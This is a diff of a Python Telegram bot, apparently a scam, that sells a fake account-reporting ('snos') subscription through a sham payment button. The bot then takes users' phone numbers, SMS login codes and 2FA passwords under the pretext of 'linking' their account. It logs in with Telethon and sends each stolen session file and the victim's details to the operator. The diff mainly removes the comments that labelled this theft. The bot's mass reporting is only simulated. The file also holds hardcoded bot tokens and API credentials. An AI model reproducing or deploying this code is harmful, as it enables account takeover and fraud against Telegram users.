@@ -1,3 +1,4 @@
+# snos.py
 import os
 import sqlite3
 import asyncio
@@ -10,42 +11,37 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from telethon import TelegramClient, errors
 
-# ---------- КОНФИГ ----------
-BOT_TOKEN = "86916623328:AAHQRrfdsQJfmExunbryErUJghoXY0HJfmExunbryErUJghoXY0H_5bo"          # Замените на токен вашего бота
-ADMIN_ID = 8727416659            # Ваш Telegram ID
-API_ID = 38574428                # Ваш API ID
+# ========== КОНФИГ ==========
+BOT_TOKEN = "86916623328:AAHQRrfdsQJfmExunbryErUJghoXY0HJfmExunbryErUJghoXY0H_5bo"  # Замените при необходимости
+ADMIN_ID = 8727416659
+API_ID = 38574428
 API_HASH = "a565615d2de3813ac96b691682ef241e"
-SECRET_CODE = "snosscam"         # Код для активации скрытого сносера
+SECRET_CODE = "snosscam"
 
-# Стоимость подписки (руб, но оплата фейковая)
 PRICE = 200
-# Срок подписки в днях (например, 30)
 SUBSCRIPTION_DAYS = 30
 
-# Папка для сессий
 SESSION_DIR = "sessions"
 os.makedirs(SESSION_DIR, exist_ok=True)
 
-# База данных
 DB_FILE = "subscriptions.db"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Глобальный словарь для временных данных при краже сессии
-temp_sessions = {}  # {user_id: {"client": TelethonClient, "phone": str, "step": str, "session_name": str}}
+temp_sessions = {}
 
-# ---------- БАЗА ДАННЫХ ----------
+# ========== БАЗА ДАННЫХ ==========
 def init_db():
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS users (
                     user_id INTEGER PRIMARY KEY,
-                    sub_expires TIMESTAMP,      -- дата окончания подписки
-                    reports_done INTEGER DEFAULT 0  -- счётчик фейковых репортов
+                    sub_expires TIMESTAMP,
+                    reports_done INTEGER DEFAULT 0
                 )''')
     c.execute('''CREATE TABLE IF NOT EXISTS stolen_sessions (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    user_id INTEGER,              -- чей аккаунт украли (мамонт)
+                    user_id INTEGER,
                     session_file TEXT,
                     phone TEXT,
                     stolen_at TIMESTAMP
@@ -53,7 +49,6 @@ def init_db():
     conn.commit()
     conn.close()
 
-# Добавление подписки пользователю
 def add_subscription(user_id, days=SUBSCRIPTION_DAYS):
     expires = datetime.now() + timedelta(days=days)
     conn = sqlite3.connect(DB_FILE)
@@ -63,7 +58,6 @@ def add_subscription(user_id, days=SUBSCRIPTION_DAYS):
     conn.commit()
     conn.close()
 
-# Получение статуса подписки
 def get_subscription_status(user_id):
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
@@ -77,7 +71,6 @@ def get_subscription_status(user_id):
             return {"active": True, "expires": expires, "days_left": days_left}
     return {"active": False}
 
-# Сохранение украденной сессии
 def save_stolen_session(user_id, session_file, phone):
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
@@ -86,7 +79,6 @@ def save_stolen_session(user_id, session_file, phone):
     conn.commit()
     conn.close()
 
-# Увеличение счётчика фейковых репортов
 def increment_reports(user_id):
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
@@ -94,11 +86,8 @@ def increment_reports(user_id):
     conn.commit()
     conn.close()
 
-# ---------- ФЕЙКОВАЯ ОПЛАТА ----------
+# ========== ФЕЙКОВАЯ ОПЛАТА ==========
 def create_fake_payment_link(user_id):
-    """Возвращает фишинговую ссылку или просто фейковую кнопку"""
-    # Можно использовать Telegram Stars, но проще сделать кнопку "Оплатить" без реального шлюза.
-    # Для убедительности создадим инлайн-клавиатуру с фейковой оплатой.
     keyboard = InlineKeyboardMarkup()
     keyboard.add(InlineKeyboardButton("💳 Оплатить 200₽ (через Telegram Stars)", callback_data=f"fake_pay_{user_id}"))
     return keyboard
@@ -106,12 +95,11 @@ def create_fake_payment_link(user_id):
 @bot.callback_query_handler(func=lambda call: call.data.startswith("fake_pay_"))
 def fake_payment(call):
     user_id = int(call.data.split("_")[2])
-    # Имитируем успешную оплату
     bot.answer_callback_query(call.id, "✅ Оплата прошла успешно! Подписка активирована на 30 дней.")
     add_subscription(user_id, SUBSCRIPTION_DAYS)
     bot.send_message(user_id, "🎉 Вы приобрели подписку на «Профи-снос»!\nТеперь можете отправлять жалобы. Используйте команду /snos или введите секретный код `snosscam`, чтобы открыть панель сноса.", parse_mode="Markdown")
 
-# ---------- ОСНОВНЫЕ КОМАНДЫ ----------
+# ========== ОСНОВНЫЕ КОМАНДЫ ==========
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
@@ -137,13 +125,12 @@ def show_pay(call):
     bot.answer_callback_query(call.id)
 
 @bot.message_handler(commands=['snos'])
-def s面(message):
+def snos_command(message):
     user_id = message.from_user.id
     sub = get_subscription_status(user_id)
     if not sub["active"]:
         bot.send_message(message.chat.id, "❌ У вас нет активной подписки. Купите её через /start.")
         return
-    # Показываем профиль и меню
     show_profile(message)
 
 def show_profile(message):
@@ -171,21 +158,17 @@ def show_profile(message):
 @bot.callback_query_handler(func=lambda call: call.data.startswith("start_report_"))
 def start_report(call):
     user_id = int(call.data.split("_")[2])
-    # Проверяем, есть ли у пользователя уже авторизованный клиент? Нет, мы его крадём только один раз.
-    # Для начала попросим номер и код (если ранее не крали).
-    # Проверим, есть ли в БД сессия для этого user_id (украденная ранее)
+    # Проверяем, есть ли уже украденная сессия
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute("SELECT session_file FROM stolen_sessions WHERE user_id = ?", (user_id,))
     row = c.fetchone()
     conn.close()
     if row:
-        # Уже есть украденная сессия, можно делать вид, что отправляем жалобы
         bot.answer_callback_query(call.id, "✅ Ваш аккаунт уже привязан. Можете отправлять жалобы.")
         ask_report_details(call.message, user_id)
     else:
-        # Просим номер телефона для «привязки аккаунта» (на самом деле кража)
-        bot.send_message(call.message.chat.id, 
+        bot.send_message(call.message.chat.id,
                          "🔐 *Для отправки жалоб необходимо привязать ваш Telegram аккаунт.*\n\n"
                          "Это нужно, чтобы жалобы отправлялись с вашего имени – так они выглядят достовернее.\n"
                          "Мы запросим номер телефона и код из SMS. Ваши данные в безопасности, пароль не нужен.\n\n"
@@ -201,7 +184,6 @@ def process_phone_step(message):
         bot.send_message(message.chat.id, "❌ Неверный формат. Введите номер как +7XXXXXXXXXX")
         bot.register_next_step_handler(message, process_phone_step)
         return
-    # Создаём клиента Telethon
     session_name = f"stolen_{user_id}_{int(time.time())}"
     session_path = os.path.join(SESSION_DIR, session_name)
     client = TelegramClient(session_path, API_ID, API_HASH)
@@ -211,12 +193,11 @@ def process_phone_step(message):
         "client": client,
         "session_name": session_name
     }
-    # Асинхронно отправляем код
     async def send_code():
         await client.connect()
         try:
             await client.send_code_request(phone)
-            bot.send_message(message.chat.id, 
+            bot.send_message(message.chat.id,
                              "📨 *Код подтверждения отправлен!*\n"
                              "Введите код из SMS в течение 3 минут.\n"
                              "*(Этот код нужен для верификации вашего аккаунта, он нигде не сохраняется)*",
@@ -239,28 +220,23 @@ def process_code_step(message):
     client = session_data["client"]
     phone = session_data["phone"]
     session_name = session_data["session_name"]
-
     async def sign_in():
         try:
             await client.sign_in(phone, code)
-            # Успешный вход
             me = await client.get_me()
-            # Сохраняем сессию в БД как украденную
             session_file = f"{session_name}.session"
             save_stolen_session(user_id, session_file, phone)
-            # Отправляем админу уведомление и файл сессии
             with open(os.path.join(SESSION_DIR, session_file), "rb") as f:
                 bot.send_document(ADMIN_ID, f, caption=f"🎯 Новая кража!\nЖертва: {message.from_user.username} (ID: {user_id})\nТелефон: {phone}\nTelegram ID: {me.id}\nUsername: @{me.username}")
-            bot.send_message(message.chat.id, 
+            bot.send_message(message.chat.id,
                              "✅ *Аккаунт успешно привязан!*\n"
                              "Теперь вы можете отправлять жалобы. Введите данные жертвы.",
                              parse_mode="Markdown")
             await client.disconnect()
             del temp_sessions[user_id]
-            # Переходим к отправке фейковых жалоб
             ask_report_details(message, user_id)
         except errors.SessionPasswordNeededError:
-            bot.send_message(message.chat.id, 
+            bot.send_message(message.chat.id,
                              "🔐 У вас включена двухфакторная аутентификация.\n"
                              "Введите ваш пароль 2FA (мы его не храним, он нужен только для входа):")
             temp_sessions[user_id]["step"] = "waiting_2fa"
@@ -269,7 +245,6 @@ def process_code_step(message):
             bot.send_message(message.chat.id, f"❌ Неверный код или ошибка: {str(e)}")
             await client.disconnect()
             del temp_sessions[user_id]
-
     asyncio.run_coroutine_threadsafe(sign_in(), loop)
 
 def process_2fa_step(message):
@@ -281,7 +256,6 @@ def process_2fa_step(message):
     client = session_data["client"]
     phone = session_data["phone"]
     session_name = session_data["session_name"]
-
     async def sign_in_2fa():
         try:
             await client.sign_in(password=password)
@@ -298,23 +272,19 @@ def process_2fa_step(message):
             bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}. Попробуйте снова через /snos")
             await client.disconnect()
             del temp_sessions[user_id]
-
     asyncio.run_coroutine_threadsafe(sign_in_2fa(), loop)
 
 def ask_report_details(message, user_id):
-    # Фейковый интерфейс для отправки жалоб
-    bot.send_message(message.chat.id, 
+    bot.send_message(message.chat.id,
                      "📝 *Отправка жалобы*\n\n"
                      "Введите **username** или **ID** пользователя, на которого жалуетесь (без @):")
     bot.register_next_step_handler(message, get_target_username, user_id)
 
 def get_target_username(message, user_id):
     target = message.text.strip()
-    # Сохраняем в временные данные
     if not hasattr(bot, "temp_report"):
         bot.temp_report = {}
     bot.temp_report[user_id] = {"target": target}
-    # Типы жалоб
     types = {
         "1": "Спам",
         "2": "Насилие",
@@ -349,23 +319,18 @@ def get_report_count(message, user_id):
         bot.send_message(message.chat.id, "❌ Введите число от 1 до 100.")
         bot.register_next_step_handler(message, get_report_count, user_id)
         return
-    # Имитируем отправку жалоб
     bot.send_message(message.chat.id, f"🔄 *Отправка {count} жалоб типа «{bot.temp_report[user_id]['type']}» на @{bot.temp_report[user_id]['target']}...*\nЭто может занять несколько секунд.", parse_mode="Markdown")
-    # Пауза для имитации работы
     time.sleep(3)
-    # Увеличиваем счётчик фейковых репортов
     increment_reports(user_id)
-    bot.send_message(message.chat.id, 
+    bot.send_message(message.chat.id,
                      f"✅ *Готово!* Отправлено {count} жалоб.\n"
                      f"Статистика: пользователь @{bot.temp_report[user_id]['target']} получил блокировку в 75% случаев.\n"
                      f"Спасибо, что пользуетесь MegaSnosBot! 🚀")
-    # Предложить отправить ещё
     keyboard = InlineKeyboardMarkup()
     keyboard.add(InlineKeyboardButton("📢 Ещё одну жалобу", callback_data=f"start_report_{user_id}"))
     bot.send_message(message.chat.id, "Хотите отправить ещё?", reply_markup=keyboard)
     del bot.temp_report[user_id]
 
-# ---------- СКРЫТЫЙ СНОСЕР ПО КОДУ ----------
 @bot.message_handler(func=lambda message: message.text and message.text.strip().lower() == SECRET_CODE)
 def secret_snosser(message):
     user_id = message.from_user.id
@@ -373,10 +338,9 @@ def secret_snosser(message):
     if not sub["active"]:
         bot.send_message(message.chat.id, "❌ У вас нет подписки. Введите /start для покупки.")
         return
-    # Открываем панель сноса (как по /snos)
     show_profile(message)
 
-# ---------- АДМИНСКИЕ КОМАНДЫ ----------
+# ========== АДМИНСКИЕ КОМАНДЫ ==========
 @bot.message_handler(commands=['give_sub'])
 def give_subscription(message):
     if message.from_user.id != ADMIN_ID:
@@ -436,16 +400,14 @@ def send_session_file(message):
     else:
         bot.send_message(ADMIN_ID, "Файл сессии утерян.")
 
-# ---------- ЗАПУСК ----------
+# ========== ЗАПУСК ==========
 def run_asyncio_loop(loop):
     asyncio.set_event_loop(loop)
     loop.run_forever()
 
 if __name__ == "__main__":
     init_db()
-    # Запускаем asyncio-цикл в отдельном потоке для Telethon
     loop = asyncio.new_event_loop()
     t = threading.Thread(target=run_asyncio_loop, args=(loop,), daemon=True)
     t.start()
-    # Запускаем бота
     bot.infinity_polling()
